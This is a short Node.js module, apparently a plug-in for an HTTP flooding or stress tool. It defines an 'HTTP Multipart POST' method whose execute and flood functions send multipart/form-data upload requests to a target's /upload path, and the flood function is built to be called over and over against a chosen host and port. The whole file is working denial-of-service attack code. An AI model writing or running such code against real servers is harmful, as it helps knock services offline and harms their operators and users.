const http = require('http');
const https = require('https');
const crypto = require('crypto');

module.exports = {
    name: 'HTTP Multipart POST',
    description: 'POST with multipart/form-data',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        const boundary = '----' + crypto.randomBytes(16).toString('hex');
        const body = [
            `--${boundary}`,
            'Content-Disposition: form-data; name="file"; filename="test.txt"',
            'Content-Type: text/plain',
            '',
            'x'.repeat(1000),
            `--${boundary}--`
        ].join('\r\n');
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/upload',
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'Content-Length': Buffer.byteLength(body)
                }
            }, (res) => {
                resolve({ status: res.statusCode });
                req.destroy();
            });
            
            req.write(body);
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        const boundary = '----' + crypto.randomBytes(8).toString('hex');
        const body = `--${boundary}\r\nContent-Disposition: form-data\r\n\r\n${'x'.repeat(500)}\r\n--${boundary}--`;
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/upload',
            method: 'POST',
            headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.write(body);
        req.end();
        req.on('error', () => callback(false));
    }
};